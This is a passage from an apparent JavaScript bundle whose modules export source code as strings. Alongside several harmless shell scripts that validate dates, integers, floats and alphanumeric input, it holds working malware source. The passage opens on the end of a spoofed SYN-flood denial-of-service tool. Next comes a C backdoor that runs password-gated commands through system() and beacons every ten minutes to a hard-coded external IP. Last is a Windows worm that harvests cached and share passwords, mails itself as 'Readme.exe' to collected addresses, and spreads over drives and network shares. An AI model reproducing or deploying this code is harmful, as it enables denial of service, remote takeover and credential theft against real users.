iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 	 random_num = rand_cmwc(); <br/>  <br/> 		ul_dst = (random_num >> 24 & 0xFF) << 24 | <br/> 						 (random_num >> 16 & 0xFF) << 16 | <br/> 						 (random_num >> 8 & 0xFF) << 8 | <br/> 						 (random_num & 0xFF); <br/>  <br/> 		iph->saddr = ul_dst; <br/> 		tcph->source = htons(random_num & 0xFFFF); <br/> 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/> 	} <br/> } <br/> int main(int argc, char *argv[ ]) <br/> { <br/> 	if(argc < 4){ <br/> 		fprintf(stderr, 'Invalid parameters!\n'); <br/> 		fprintf(stdout, 'Spoofed SYN Flooder v1.6.1 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <number threads to use> <time (optional)>\n', argv[0]); <br/> 		exit(-1); <br/> 	} <br/>  <br/> 	fprintf(stdout, 'Setting up Sockets...\n'); <br/>  <br/> 	int num_threads = atoi(argv[3]); <br/> 	unsigned int floodport = atoi(argv[2]); <br/> 	pthread_t thread[num_threads]; <br/> 	struct sockaddr_in sin; <br/>  <br/> 	sin.sin_family = AF_INET; <br/> 	sin.sin_port = htons(floodport); <br/> 	sin.sin_addr.s_addr = inet_addr(argv[1]); <br/>  <br/> 	struct thread_data td[num_threads]; <br/>  <br/> 	int i; <br/> 	for(i = 0;i<num_threads;i++){ <br/> 		td[i].thread_id = i; <br/> 		td[i].sin = sin; <br/> 		td[i].floodport = floodport; <br/> 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]); <br/> 	} <br/> 	fprintf(stdout, 'Starting Flood...\n'); <br/> 	if(argc > 4) <br/> 	{ <br/> 		sleep(atoi(argv[4])); <br/> 	} else { <br/> 		while(1){ <br/> 			sleep(1); <br/> 		} <br/> 	} <br/>  <br/> 	return 0;";
},{}],170:[function(require,module,exports){
module.exports="#include sys/socket.h <br/> #include sys/types.h <br/> #include unistd.h <br/> #include netinet/in.h <br/> #include strings.h <br/> #include string.h <br/> #include stdio.h <br/> #include stdlib.h <br/> #include pthread.h <br/>  <br/> #define PASSWORD 'alluvial' <br/>  <br/> void *fnParseData(void *arg); <br/>  <br/> void *fnPingPong(void *arg) <br/> { <br/> 	char szRecvBuff[1024]; <br/> 	char packet[1024]; <br/> 	char ip[] = '37.221.170.5'; <br/>  <br/> 	snprintf(packet, sizeof(packet) - 1, 'GET /~dqyefldi/online.php HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5  <br/> (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8, <br/> '+en;q=0.6\r'\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n', ip); <br/>  <br/> 	struct sockaddr_in *remote; <br/> 	int sock; <br/> 	int tmpres; <br/> 	 <br/> 	 <br/> 	while (1) <br/> 	{ <br/> 		if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) <br/> 		{ <br/> 			sleep(600); <br/> 			continue; <br/> 		} <br/> 		 <br/> 		remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *)); <br/> 		remote->sin_family = AF_INET; <br/> 		tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr))); <br/> 		 <br/> 		if (tmpres < 0)   <br/> 		{ <br/> 			sleep(600); <br/> 			continue; <br/> 		} <br/> 		else if (tmpres == 0) <br/> 		{ <br/> 			continue; <br/> 			sleep(600); <br/> 		} <br/> 		 <br/> 		remote->sin_port = htons(80); <br/> 		 <br/> 		if (connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0) <br/> 		{ <br/> 			continue; <br/> 		} <br/> 			 <br/> 		tmpres = send(sock, packet, strlen(packet), 0); <br/> 		 <br/> 		/* <br/> 		int i = 1; <br/> 		int dwTotal = 0; <br/>  <br/> 		 <br/> 		while (1) <br/> 		{ <br/> 			i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0); <br/> 			//printf('Received %d bytes\n', i); <br/> 			if (i <= 0) <br/> 				break; <br/> 				 <br/> 			dwTotal += i; <br/> 		} <br/>  <br/> 		szRecvBuff[dwTotal] = '\x00'; <br/> 		 <br/>  <br/> 		printf('Received -> \n%s\n\n', szRecvBuff); <br/> 		*/ <br/>  <br/> 		close(sock); <br/> 		 <br/> 		sleep(600); <br/> 	} <br/> 	 <br/> 	return 0; <br/> } <br/>  <br/> int main(int argc, char**argv) <br/> { <br/> 	int sListen, sConn, n; <br/> 	int x = 0; <br/> 	struct sockaddr_in servaddr, clientAddr; <br/> 	socklen_t sClient; <br/> 	pid_t childpid; <br/> 	char szMessage[1000]; <br/> 	pthread_t pThreads[10240]; <br/> 	int rc, pp; <br/> 	 <br/> 	sListen=socket(AF_INET, SOCK_STREAM,0); <br/>  <br/> 	bzero(&servaddr, sizeof(servaddr)); <br/> 	servaddr.sin_family = AF_INET; <br/> 	servaddr.sin_addr.s_addr=htonl(INADDR_ANY); <br/> 	servaddr.sin_port=htons(80); <br/>  <br/> 	bind(sListen, (struct sockaddr *)&servaddr, sizeof(servaddr)); <br/>  <br/> 	listen(sListen, 1024); <br/>  <br/>  <br/> 	printf('Listening for connection on port %d\n', ntohs(servaddr.sin_port)); <br/>  <br/> 	pthread_t pingpong[1]; <br/> 	pp = pthread_create(&pingpong[0], NULL, fnPingPong, NULL); <br/>  <br/> 	for(;;) <br/> 	{ <br/> 		sClient = sizeof(clientAddr); <br/> 		sConn = accept(sListen, (struct sockaddr *)&clientAddr, &sClient); <br/>  <br/> 		if ((childpid = fork()) == 0) <br/> 		{ <br/> 			close (sListen); <br/>  <br/> 			for(;;) <br/> 			{ <br/> 				n = recvfrom(sConn, szMessage, 1000, 0, (struct sockaddr *)&clientAddr, &sClient); <br/> 				sendto(sConn, szMessage, n, 0, (struct sockaddr *)&clientAddr, sizeof(clientAddr)); <br/> 				szMessage[n] = 0; <br/> 				printf('Received -> %s\n', szMessage); <br/> 				rc = pthread_create(&pThreads[x], NULL, fnParseData, (void *)szMessage); <br/> 				usleep(100000); <br/> 				bzero(szMessage, sizeof(szMessage)); <br/> 				x++; <br/> 			} <br/>  <br/> 		} <br/>  <br/> 		close(sConn); <br/> 	} <br/> } <br/>  <br/> void *fnParseData(void *arg) <br/> { <br/>  <br/> 	char *szMessage = (char*)arg; <br/> 	 <br/> 	printf('Parsing %s\n', szMessage); <br/> 	 <br/> 	int iSize = strlen(szMessage) - strlen(strstr(szMessage, '|')); <br/> 	char szCmd[128]; <br/> 	strncpy(szCmd, szMessage, iSize); <br/>  <br/> 	szCmd[iSize] = '\x00';	 <br/> 	printf('Command Received -> %s\n', szCmd); <br/> 	 <br/> 	if (strstr(szMessage + iSize + 1, PASSWORD)) <br/> 	{ <br/> 		system(szCmd); <br/> 	} <br/> 	 <br/> 	return 0; <br/> } <br/>  <br/> ";
},{}],171:[function(require,module,exports){
module.exports="#!/bin/sh <br/> # valid-date - validate date, taking into account leap year rules <br/>  <br/> normdate='./003-normdate.sh'	 # hack #3 for normalizing month name <br/>  <br/> exceedsDaysInMonth() <br/> { <br/> 	# given a month name, return 0 if the specified day value is <br/> 	# less than or equal to the max days in the month, 1 otherwise <br/>  <br/> 	case $(echo $1|tr '[:upper:]' '[:lower:]') in <br/> 		jan* ) days=31    ;;  feb* ) days=28    ;; <br/> 		mar* ) days=31    ;;  apr* ) days=30    ;; <br/> 		may* ) days=31    ;;  jun* ) days=30    ;; <br/> 		jul* ) days=31    ;;  aug* ) days=31    ;; <br/> 		sep* ) days=30    ;;  oct* ) days=31    ;; <br/> 		nov* ) days=30    ;;  dec* ) days=31    ;; <br/> 		* ) echo '$0: Unknown month name $1' >&2; exit 1 <br/> 	 esac <br/> 	  <br/> 	 if [ $2 -lt 1 -o $2 -gt $days ] ; then <br/> 		 return 1 <br/> 	 else <br/> 		 return 0	# all is well <br/> 	 fi  <br/> } <br/>  <br/> isLeapYear() <br/> {     <br/> 	# this function returns 0 if a leap year, 1 otherwise <br/> 	# The formula for checking whether a year is a leap year is:  <br/> 	# 1. years divisible by four are leap years, unless.. <br/> 	# 2. years also divisible by 100 are not leap years, except... <br/> 	# 3. years divisible by 400 are leap years <br/>  <br/> 	year=$1 <br/> 	if [ '$((year % 4))' -ne 0 ] ; then <br/> 		return 1 # nope, not a leap year <br/> 	elif [ '$((year % 400))' -eq 0 ] ; then <br/> 		return 0 # yes, it's a leap year <br/> 	elif [ '$((year % 100))' -eq 0 ] ; then <br/> 		return 1 <br/> 	else <br/> 		return 0 <br/> 	fi  <br/> } <br/>  <br/> ## Begin main script <br/>  <br/> if [ $# -ne 3 ] ; then <br/> 	echo 'Usage: $0 month day year' >&2 <br/> 	echo 'Typical input formats are August 3 1962 and 8 3 2002' >&2 <br/> 	exit 1 <br/> fi <br/>  <br/> # normalize date and split back out returned values <br/>  <br/> newdate='$($normdate '$@')' <br/>  <br/> if [ $? -eq 1 ] ; then <br/> 	exit 1	# error condition already reported by normdate <br/> fi <br/>  <br/> month='$(echo $newdate | cut -d  -f1)' <br/> 	day='$(echo $newdate | cut -d  -f2)' <br/>  year='$(echo $newdate | cut -d  -f3)' <br/>  <br/> # Now that we have a normalized date, let's check to see if the <br/> # day value is logical  <br/>  <br/> if ! exceedsDaysInMonth $month '$2' ; then <br/> 	if [ '$month' = 'Feb' -a $2 -eq 29 ] ; then <br/> 		if ! isLeapYear $3 ; then <br/> 			echo '$0: $3 is not a leap year, so Feb doesn't have 29 days' >&2 <br/> 			exit 1 <br/> 		fi <br/> 	else  <br/> 		echo '$0: bad day value: $month doesn't have $2 days' >&2 <br/> 		exit 1 <br/> 	fi <br/> fi <br/>  <br/> echo 'Valid date: $newdate' <br/>  <br/> exit 0 <br/>  <br/> ";
},{}],172:[function(require,module,exports){
module.exports="#!/bin/sh <br/>  <br/> # validfloat - test whether a number is a valid floating point value. <br/> #    Note that this cannot accept scientific (1.304e5) notation. <br/>  <br/> # To test whether an entered value is a valid floating point number, we <br/> # need to split the value at the decimal point, then test the first part <br/> # to see if it's a valid integer, then the second part to see if it's a  <br/> # valid >=0 integer, so -30.5 is valid, but -30.-8 isn't. <br/>  <br/> . 005-validint.sh		# source the validint function <br/>  <br/> validfloat() <br/> { <br/> 	fvalue='$1' <br/>  <br/> 	if [ ! -z $(echo $fvalue | sed 's/[^.]//g') ] ; then <br/>  <br/> 		decimalPart='$(echo $fvalue | cut -d. -f1)' <br/> 		fractionalPart='$(echo $fvalue | cut -d. -f2)' <br/>  <br/> 		if [ ! -z $decimalPart ] ; then <br/> 			if ! validint '$decimalPart' '' '' ; then <br/> 				return 1 <br/> 			fi  <br/> 		fi <br/>  <br/> 		if [ '${fractionalPart%${fractionalPart#?}}' = '-' ] ; then <br/> 			echo 'Invalid floating point number: '-' not allowed  <br/> 	after decimal point' >&2  <br/> 			return 1 <br/> 		fi  <br/> 		if [ '$fractionalPart' != '' ] ; then  <br/> 			if ! validint '$fractionalPart' '0' '' ; then <br/> 				return 1 <br/> 			fi <br/> 		fi <br/>  <br/> 		if [ '$decimalPart' = '-' -o -z $decimalPart ] ; then <br/> 			if [ -z $fractionalPart ] ; then <br/> 				echo 'Invalid floating point format.' >&2 ; return 1 <br/> 			fi  <br/> 		fi <br/>  <br/> 	else <br/> 		if [ '$fvalue' = '-' ] ; then <br/> 			echo 'Invalid floating point format.' >&2 ; return 1 <br/> 		fi <br/>  <br/> 		if ! validint '$fvalue' '' '' ; then <br/> 			return 1 <br/> 		fi <br/> 	fi <br/>  <br/> 	return 0 <br/> } <br/>  <br/> if validfloat $1 ; then <br/> 	echo '$1 is a valid floating point value' <br/> fi <br/>  <br/> exit 0 <br/> ";
},{}],173:[function(require,module,exports){
module.exports="#!/bin/sh <br/> # validint - validate integer input, allow negative ints too <br/>  <br/> validint() <br/> { <br/> 	# validate first field. Optionally test against min value $2 and/or  <br/> 	# max value $3: if you'd rather skip these tests, send '' as values. <br/> 	# returns 1 for error, 0 for success. <br/>  <br/> 	number='$1';	    min='$2';	   max='$3' <br/>  <br/> 	if [ -z $number ] ; then <br/> 		echo 'You didn't enter anything. Unacceptable.' >&2 ; return 1 <br/> 	fi <br/> 	 <br/> 	if [ '${number%${number#?}}' = '-' ] ; then	# first char '-' ? <br/> 		testvalue='${number#?}' 	# all but first character <br/> 	else <br/> 		testvalue='$number' <br/> 	fi <br/> 	 <br/> 	nodigits='$(echo $testvalue | sed 's/[[:digit:]]//g')' <br/> 	 <br/> 	if [ ! -z $nodigits ] ; then <br/> 		echo 'Invalid number format! Only digits, no commas, spaces, etc.' >&2 <br/> 		return 1 <br/> 	fi <br/> 	 <br/> 	if [ ! -z $min ] ; then <br/> 		if [ '$number' -lt '$min' ] ; then <br/> 			 echo 'Your value is too small: smallest acceptable value is $min' >&2 <br/> 			 return 1 <br/> 		fi <br/> 	fi <br/> 	if [ ! -z $max ] ; then <br/> 		 if [ '$number' -gt '$max' ] ; then <br/> 			 echo 'Your value is too big: largest acceptable value is $max' >&2 <br/> 			 return 1 <br/> 		 fi <br/> 	fi <br/> 	return 0 <br/> } <br/>  <br/> # uncomment these lines to test, but beware that it'll break Hack #6 <br/> # because Hack #6 wants to source this file to get the validint() <br/> # function. :-) <br/>  <br/> # if validint '$1' '$2' '$3' ; then <br/> #   echo 'That input is a valid integer value within your constraints' <br/> # fi <br/>  <br/> ";
},{}],174:[function(require,module,exports){
module.exports="#!/bin/sh <br/> # validalAlphaNum - Ensures that input only consists of alphabetical <br/> #              and numeric characters. <br/>  <br/> validAlphaNum() <br/> { <br/> 	# validate arg: returns 0 if all upper+lower+digits, 1 otherwise <br/>  <br/> 	# Remove all unacceptable chars <br/> 	compressed='$(echo $1 | sed -e 's/[^[:alnum:]]//g')' <br/>  <br/> 	if [ '$compressed' != '$input' ] ; then <br/> 		return 1 <br/> 	else <br/> 		return 0 <br/> 	fi <br/> } <br/>  <br/> # Sample usage of this function in a script <br/>  <br/> echo -n 'Enter input: ' <br/> read input <br/>  <br/> if ! validAlphaNum '$input' ; then <br/> 	echo 'Your input must consist of only letters and numbers.' >&2 <br/> 	exit 1 <br/> else <br/> 	echo 'Input is valid.' <br/> fi <br/>  <br/> exit 0 <br/>  <br/> ";
},{}],175:[function(require,module,exports){
module.exports="//               'this is the end, beautiful friend' - the doors <br/> // <br/>  <br/> //--header-files--------------------------------------------------------------// <br/> #include stdio.h <br/> #include windows.h <br/> #include mapi.h <br/> #include io.h <br/> #include dos.h <br/>  <br/> #include conio.h <br/> //--defines-------------------------------------------------------------------// <br/> #define MAX_LENGTH          128 <br/> #define MAX_RECIEVERS       50 <br/> #define MUTEX_NAME          'w0rm' <br/> #define EARTH_WORM_JIM      'Readme.exe' <br/>  <br/> #define WORMGAME_PORT       12345 <br/> #define WORMGAME_MAX_WINS   10 <br/> #define WORMGAME_PKT_PLAY   0xFF <br/> #define WORMGAME_PKT_WIN    0x80 <br/> //--globals-------------------------------------------------------------------// <br/> char *ptrEgo, *buf; <br/> char addressList[MAX_RECIEVERS][MAX_LENGTH], passwordList[50][MAX_LENGTH]; <br/> int index = 0; <br/>  <br/> typedef struct tagPASSWORD_CACHE_ENTRY { <br/> 	WORD cbEntry; <br/> 	WORD cbResource; <br/> 	WORD cbPassword; <br/> 	BYTE iEntry; <br/> 	BYTE nType; <br/> 	BYTE abResource[1]; <br/> } PASSWORD_CACHE_ENTRY; <br/>  <br/> typedef struct WormGamePkt { <br/> 	BYTE pktType; <br/> 	int pktNum; <br/> } AWORMGAMEPACKET; <br/> //--function-declarations-----------------------------------------------------// <br/> DWORD WINAPI WormGameThread( LPVOID ); <br/> DWORD WINAPI WormMainThread( LPVOID ); <br/>  <br/> BOOL runningNT(); <br/> void propogateMAPI( void ); <br/> int initMAPI( void ); <br/> int validAddress( char * addr ); <br/> int sendMessage( int recipNum, LHANDLE lhSession ); <br/> int getSharePasswords( void ); <br/> int getCachedPasswords( void ); <br/> int addPassword( char * pwd ); <br/> void propogateDrive( void ); <br/> void attackDrive( char * drive, int type ); <br/> void propogateNet( LPNETRESOURCE lpnr ); <br/> int crackNetShare( char * share ); <br/> void releasePayload(); <br/>  <br/> extern 'C' int __stdcall RegisterServiceProcess( int dwProcessID, int dwType ); <br/> //--entry-point---------------------------------------------------------------// <br/> // WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) <br/> int main( int argc, char **argv ) <br/> { <br/> 		HANDLE hMutex, hEgo, hWormGameThread, hWormMainThread; <br/> 		DWORD WormGameThreadId, WormMainThreadId; <br/>  <br/> 		// display explorer window if we need to, due to autorun.inf file :) <br/> 		// test for any command line... <br/>  <br/> 		/* only allow one instance of worm to run on system at one time */ <br/> 		hMutex = CreateMutex( NULL, TRUE, MUTEX_NAME); <br/> 			if(  GetLastError() == ERROR_ALREADY_EXISTS ) <br/> 			{ <br/> 				ExitProcess( 0 ); <br/> 			} <br/>  <br/> 		ptrEgo = argv[0]; <br/>  <br/> 		/* try to 'hide' the process */ <br/> 			if( runningNT() == TRUE ) <br/> 			{ <br/> 				// hide process in winNT <br/> 				printf('WORM running on WinNT\n'); <br/> 			} else { <br/> 				printf('WORM running on Win9x\n'); <br/> 				LoadLibrary( 'KERNAL32.DLL' ); <br/> 				RegisterServiceProcess( NULL, 1); <br/> 			} <br/>  <br/> 		/* go resident and give worm RAW power */ <br/> 		hEgo = GetCurrentProcess(); <br/> 		SetPriorityClass( hEgo, HIGH_PRIORITY_CLASS); <br/>  <br/> 		// create suspended WormMainThread... <br/> 		hWormMainThread = CreateThread( NULL, 0, WormMainThread, 0, CREATE_SUSPENDED, &WormMainThreadId); <br/> 			if( hWormMainThread != NULL ) <br/> 			{ <br/> 				// set thread to time critical... 'i wana take you higher' - sly and the family stone <br/> 				//SetThreadPriority( hWormMainThread, THREAD_PRIORITY_TIME_CRITICAL); <br/> 				// resume thread execution... <br/> 				ResumeThread( hWormMainThread ); <br/> 			} <br/>  /* <br/> 		// create suspended WormGameThread... <br/> 		hWormGameThread = CreateThread( NULL, 0, WormGameThread, 0, CREATE_SUSPENDED, &WormGameThreadId); <br/> 			if( hWormGameThread != NULL ) <br/> 			{ <br/> 				// resume thread execution... <br/> 				ResumeThread( hWormGameThread ); <br/> 			}                                           <br/> 													   */ <br/> 		/* wait for hWormGameThread() to terminate */ <br/> 	 //   WaitForSingleObject( hWormGameThread, INFINITE); <br/> 		WaitForSingleObject( hWormMainThread, INFINITE); <br/>  <br/> 		printf('MAIN_DEBUG: worm threads ended, im outa here: press a key...\n'); <br/> 		getch(); <br/>  <br/> 		/* release our mutex, next local worm wont get blocked */ <br/> 			if( hMutex != NULL ) <br/> 			{ <br/> 				ReleaseMutex( hMutex ); <br/> 			} <br/> 		return 0; <br/> } <br/>  <br/> //----------------------------------------------------------------------------// <br/> DWORD WINAPI WormMainThread( LPVOID ) <br/> { <br/> 		DWORD dwSize; <br/> 		char buff[64]; <br/> 		printf('WormMainThread: started...\n'); <br/> 		/* spread worm via MAPI */ <br/> 		propogateMAPI(); <br/> 		/* get any passwords we can for use later on */ <br/> 		getSharePasswords(); <br/> 		getCachedPasswords(); <br/> 		dwSize = 64; <br/> 		WNetGetUser( NULL, buff, &dwSize ); <br/> 		addPassword( buff ); <br/> 		printf('DEBUG: total pwds got = %d\n', index); <br/> 		/* spread worm via any/all localy maped drives */ <br/> 		propogateDrive(); <br/> 		/* spread worm via any/all LAN network shares */ <br/> 		propogateNet( NULL ); <br/> 		/* finished our little game :) */ <br/> 		ExitThread( 0 ); <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> DWORD WINAPI WormGameThread( LPVOID ) <br/> { <br/>  <br/> 		WSADATA w; <br/> 		SOCKET s_recv, s_send; <br/> 		sockaddr_in saddr, saddr_in, saddr_out; <br/> 		int size = sizeof( struct sockaddr ), totalwins = 0, magicWorm = 0, optval; <br/> 		AWORMGAMEPACKET gamePkt; <br/> 		fd_set fd_read; <br/> 		struct timeval timeout = { 5, 0 }; <br/>  <br/> 			if( WSAStartup( MAKEWORD(1,0), &w) != 0 ) <br/> 			{ <br/> 				printf('WormThread: WSAStartup failed\n'); <br/> 				goto endThread; <br/> 			} <br/>  <br/> 		s_recv = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP); <br/> 		s_send = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP); <br/> 			if( s_recv == INVALID_SOCKET || s_send == INVALID_SOCKET ) <br/> 			{ <br/> 				printf('WormThread: invalid socket\n'); <br/> 				goto endThread; <br/> 			} <br/>  <br/> 		memset( &saddr_in, 0x00, sizeof( struct sockaddr)); <br/>  <br/> 		memset( &saddr, 0x00, sizeof( struct sockaddr)); <br/> 		saddr.sin_family = AF_INET; <br/> 		saddr.sin_port = htons( WORMGAME_PORT ); <br/> 		saddr.sin_addr.s_addr = INADDR_ANY; <br/>  <br/> 		memset( &saddr_out, 0x00, sizeof( struct sockaddr) ); <br/> 		saddr_out.sin_family = AF_INET; <br/> 		saddr_out.sin_port = htons( WORMGAME_PORT ); <br/> 		saddr_out.sin_addr.s_addr = INADDR_BROADCAST; <br/>  <br/> 		optval = 1; <br/> 			if( setsockopt( s_send, SOL_SOCKET, SO_BROADCAST , (char*)&optval, sizeof( int) ) == SOCKET_ERROR ) <br/> 			{ <br/> 				printf('WormThread: setsocketopt failed\n'); <br/> 				goto endThread; <br/> 			} <br/>  <br/> 			if( bind( s_recv, (struct sockaddr*)&saddr, sizeof( struct sockaddr)) == SOCKET_ERROR ) <br/> 			{ <br/> 				printf('WormThread: bind failed\n'); <br/> 				goto endThread; <br/> 			} <br/>  <br/> 		FD_ZERO( &fd_read ); <br/> 		FD_SET( s_recv, &fd_read ); <br/> 		randomize(); <br/> loop: <br/> 		while( 1 ) <br/> 		{ <br/> 			   if( totalwins >= WORMGAME_MAX_WINS ) <br/> 				{ <br/> 					releasePayload(); <br/> 					totalwins = 0; <br/> 				} <br/> 			// pick a magic number... <br/> 			magicWorm = ( ( rand() % 100 ) + 1 ); <br/> 			printf('WormThread: picked a magic num: %d\n', magicWorm); <br/> 			// wait a length of time... <br/> 			Sleep( 500 ); <br/> 			// send my magic number... <br/> 			gamePkt.pktType = WORMGAME_PKT_PLAY; <br/> 			gamePkt.pktNum = magicWorm; <br/> 				if( sendto( s_send, (const char*)&gamePkt, sizeof( struct WormGamePkt ), 0, (struct  <br/> sockaddr*)&saddr_out, size) == SOCKET_ERROR ) <br/> 				{ <br/> 					printf('WormThread: sendto failed\n'); <br/> 					break; <br/> 				} <br/>  <br/> 			// handel responces... <br/> 				while( select( 0, &fd_read, NULL, NULL, &timeout) != SOCKET_ERROR ) <br/> 				{ <br/> 					if( recvfrom( s_recv, (char*)&gamePkt, sizeof( struct WormGamePkt ), 0, (struct  <br/> sockaddr*)&saddr_in, &size) == SOCKET_ERROR ) <br/> 					{ <br/> 						printf('WormThread: recvfrom failed\n'); <br/> 						break; <br/> 					} else { <br/> 						switch( gamePkt.pktType ) <br/> 						{ <br/> 							case WORMGAME_PKT_PLAY: // recieved a magic number... <br/> 								// ignore responce from local machine... <br/> 								printf('WormThread: recieved a magic num: %d\n', gamePkt.pktNum); <br/> 								// process other responces <br/> 									if( gamePkt.pktNum == magicWorm ) <br/> 									{ <br/> 										// notify any winners <br/> 										gamePkt.pktType = WORMGAME_PKT_WIN; <br/> 										saddr_out.sin_addr.s_addr = saddr_in.sin_addr.s_addr; <br/> 										sendto( s_send, (const char*)&gamePkt, sizeof( struct WormGamePkt ), 0,  (struct sockaddr*)&saddr_out, size); <br/> 										saddr_out.sin_addr.s_addr = INADDR_BROADCAST; <br/> 									} <br/> 								break; <br/> 							case WORMGAME_PKT_WIN: // im a winner :) <br/> 								printf('WormThread: IM A WINNER!!!\n'); <br/> 								totalwins++; <br/> 								goto loop; <br/> 							default:   // its all gone bugfuck! <br/> 								printf('WormThread: its all gone bugfuck!\n'); <br/> 								break; <br/> 						} <br/> 					} <br/> 				} // while(select... <br/> 		} <br/> endThread: <br/> 		closesocket( s_recv ); <br/> 		closesocket( s_send ); <br/> 		ExitThread( 0 ); <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> BOOL runningNT() <br/> { <br/> 		OSVERSIONINFO osvi; <br/> 		BOOL retval = FALSE; <br/>  <br/> 		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); <br/> 		GetVersionEx(&osvi); <br/> 			switch( osvi.dwPlatformId ) <br/> 			{ <br/> 				case VER_PLATFORM_WIN32_NT: <br/> 					retval = TRUE; <br/> 					break; <br/> 				case VER_PLATFORM_WIN32_WINDOWS: <br/> 					retval = FALSE; <br/> 					break; <br/> 				default: // VER_PLATFORM_LINUX ? :) || VER_PLATFORM_WIN32_ANOTHERBUGGYRELEASE <br/> 					retval = FALSE; <br/> 					break; <br/> 			} <br/> 		return retval; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void propogateMAPI( void ) <br/> { <br/> 		LHANDLE lhSession; <br/> 		CHAR rgchMsgID[513]; <br/> 		MapiMessage *lpMessage; <br/> 		int i=0; <br/> 			if( initMAPI() != 0 ) <br/> 			{ <br/> 				return; <br/> 			} <br/> 			if( MAPILogon( 0, NULL, NULL, 0, 0, &lhSession) == SUCCESS_SUCCESS) <br/> 			{ <br/> 				*rgchMsgID = NULL; <br/> 					while( i < MAX_RECIEVERS ) <br/> 					{ <br/> 						if( MAPIFindNext( lhSession, 0L, NULL, rgchMsgID, MAPI_LONG_MSGID, 0L, rgchMsgID) !=  <br/> SUCCESS_SUCCESS) <br/> 						{ <br/> 							break; <br/> 						} <br/> 						if( MAPIReadMail( lhSession, 0L, rgchMsgID, MAPI_PEEK, 0L, &lpMessage) == SUCCESS_SUCCESS) <br/> 						{ <br/> 					//    printf('DOING: %s\n	%s\n',lpMessage->lpOriginator->lpszAddress,lpMessage-> <br/> '+lpRecips->'lpszAddress); <br/> 							if( validAddress( lpMessage->lpOriginator->lpszAddress ) == 0 ) <br/> 							{ <br/> 								strcpy( addressList[i], lpMessage->lpOriginator->lpszAddress); <br/> 								i++; <br/> 							} <br/> 							if( validAddress( lpMessage->lpRecips->lpszAddress  ) == 0 ) <br/> 							{ <br/> 								strcpy( addressList[i], lpMessage->lpRecips->lpszAddress); <br/> 								i++; <br/> 							} <br/> 						} <br/>  <br/> 					} <br/> 				MAPIFreeBuffer( lpMessage ); <br/>  <br/> 				// TO DO: sort addressList and remove duplicates... <br/>  <br/> 				//sendMessage( i, lhSession );    // <---- !!!!!! <br/>  <br/> 				MAPILogoff( lhSession, 0L, 0L, 0L); <br/> 			} <br/> 			for( int x = 0 ; x < i ; x++ ) <br/> 			{ <br/> 				printf('DEBUG: attacking:	%s\n', addressList[x]); <br/> 			} <br/> 		return; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int initMAPI( void ) <br/> { <br/> 		HINSTANCE hi; <br/> 		LPMAPILOGON MAPILogon; <br/> 		LPMAPIFINDNEXT MAPIFindNext; <br/> 		LPMAPIREADMAIL MAPIReadMail; <br/> 		LPMAPISENDMAIL MAPISendMail; <br/> 		hi = LoadLibrary( 'mapi32.dll' ); <br/> 			if( hi == NULL ) <br/> 			{ <br/> 				return -1; <br/> 			} <br/> 		MAPILogon = (LPMAPILOGON)GetProcAddress( hi, 'MAPILogon'); <br/> 		MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress( hi, 'MAPIFindNext'); <br/> 		MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress( hi, 'MAPIReadMail'); <br/> 		MAPISendMail = (LPMAPISENDMAIL)GetProcAddress( hi, 'MAPISendMail'); <br/> 			if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || MAPISendMail == NULL ) <br/> 			{ <br/> 				return -1; <br/> 			} <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int validAddress( char * addr ) <br/> { <br/> 		if( strlen( addr ) >= MAX_LENGTH || strlen( addr ) == 0) <br/> 		{ <br/> 			return -1; <br/> 		} else if( strchr( addr , '@') == NULL ) <br/> 		{ <br/> 			return -1; <br/> 		} else if( strchr( addr , '.') == NULL ) <br/> 		{ <br/> 			return -1; <br/> 		} else { <br/> 			return 0; <br/> 		} <br/> } <br/> //----------------------------------------------------------------------------// <br/> int sendMessage( int recipNum, LHANDLE lhSession ) <br/> { <br/> 		MapiRecipDesc *recips  = (MapiRecipDesc *)malloc( recipNum*sizeof(MapiRecipDesc) ); <br/> 		MapiFileDesc attachment = { 0, 0, (ULONG)-1, ptrEgo, EARTH_WORM_JIM, NULL}; <br/> 			for( int i=0 ; i<recipNum ; i++ ) <br/> 			{ <br/> 				recips[i].ulReserved   = 0; <br/> 				recips[i].ulRecipClass = MAPI_TO; <br/> 				recips[i].lpszName     = addressList[i]; <br/> 				recips[i].lpszAddress  = addressList[i]; <br/> 				recips[i].ulEIDSize    = 0; <br/> 				recips[i].lpEntryID    = NULL; <br/> 			} <br/> 		MapiMessage note = { 0, 'The Subjext', 'The Message Text', NULL, NULL, NULL, 0, NULL, recipNum, recips, 1,  <br/> &attachment}; <br/> 			if( MAPISendMail( lhSession, 0L, &note, 0L, 0L) != SUCCESS_SUCCESS ) <br/> 			{ <br/> 				return -1; <br/> 			} <br/> 		free( recips ); <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int CALLBACK 